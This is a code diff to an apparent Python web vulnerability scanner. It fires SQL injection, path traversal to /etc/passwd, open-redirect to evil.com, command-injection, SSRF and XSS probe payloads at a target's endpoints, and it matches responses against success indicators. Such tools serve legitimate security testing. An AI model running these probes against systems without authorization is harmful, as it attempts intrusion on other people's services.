@@ -1,17 +1,17 @@
-import requests, re, json, os
+import requests, os
 from urllib.parse import urljoin, urlencode
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from config import HTTP_HEADERS, DEFAULT_TIMEOUT, COMMON_ENDPOINTS
 from module.other import Other
 
 class Top25FastScanner:
-    METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
+    METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH"]
 
     PAYLOAD = {
-        "SQLi": "1 OR 1=1",
+        "SQLi": "1' OR '1'='1",
         "LFI": "../../../../etc/passwd",
-        "OpenRedirect": "http://evil.com",
-        "RCE": "id",
+        "OpenRedirect": "https://evil.com",
+        "RCE": "`id`",
         "SSRF": "http://127.0.0.1",
         "XSS": "<script>alert(1)</script>"
     }
@@ -42,18 +42,14 @@ class Top25FastScanner:
 
         with ThreadPoolExecutor(max_workers=self.thread) as executor:
             for category, params in self.PARAMS.items():
-                if category not in self.PAYLOAD:
-                    continue
                 payload = self.PAYLOAD[category]
                 for param in params:
                     for endpoint in endpoints:
                         url = urljoin(self.target, endpoint)
                         for method in self.METHODS:
-                            tasks.append(
-                                executor.submit(
-                                    self._scan_once, category, method, url, endpoint, param, payload
-                                )
-                            )
+                            tasks.append(executor.submit(
+                                self._scan_once, category, method, url, endpoint, param, payload
+                            ))
 
             for future in as_completed(tasks):
                 res = future.result()
@@ -63,9 +59,7 @@ class Top25FastScanner:
                     colored_param = self.printer.color_text(res["param"], "green")
                     colored_status = self.printer.color_text(str(res["status"]), "green" if res["status"] == 200 else "red")
 
-                    if self.verbose or res["status"] == 200:
-                        print(f"[*] [Module: {colored_module}] [Cat: {colored_cat}] [Method: {colored_method}] [Param: {colored_param}] [Status: {colored_status}]")
-
+                    print(f"[*] [Module: {colored_module}] [Cat: {colored_cat}] [Method: {colored_method}] [Param: {colored_param}] [Status: {colored_status}]")
                     results.append(res)
 
         return {"target": self.target, "findings": results}
@@ -74,19 +68,31 @@ class Top25FastScanner:
         try:
             data = {param: value}
             if method == "GET":
-                r = self.session.get(f"{url}?{urlencode(data)}", timeout=DEFAULT_TIMEOUT, allow_redirects=False)
+                full_url = f"{url}?{urlencode(data)}"
+                r = self.session.get(full_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
             else:
                 r = self.session.request(method, url, data=data, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
+                full_url = url
 
-            if r.status_code not in [401, 403, 404, 405] and r.status_code < 500:
-                return {
-                    "category": category,
-                    "method": method,
-                    "endpoint": endpoint,
-                    "param": param,
-                    "payload": value,
-                    "status": r.status_code
+            if r.status_code in [200, 201] and not any(bad in r.text.lower() for bad in ["not found", "error", "forbidden", "denied"]):
+                indicators = {
+                    "SQLi": ["mysql", "syntax", "sql", "query failed"],
+                    "LFI": ["root:x:0:0", "/bin/bash"],
+                    "OpenRedirect": ["evil.com"],
+                    "RCE": ["uid=", "gid="],
+                    "SSRF": ["localhost", "127.0.0.1"],
+                    "XSS": ["<script>alert(1)</script>"]
                 }
+                signs = indicators.get(category, [])
+                if any(s in r.text.lower() for s in signs):
+                    return {
+                        "category": category,
+                        "method": method,
+                        "endpoint": endpoint,
+                        "param": param,
+                        "payload": value,
+                        "status": r.status_code
+                    }
 
         except:
             return None
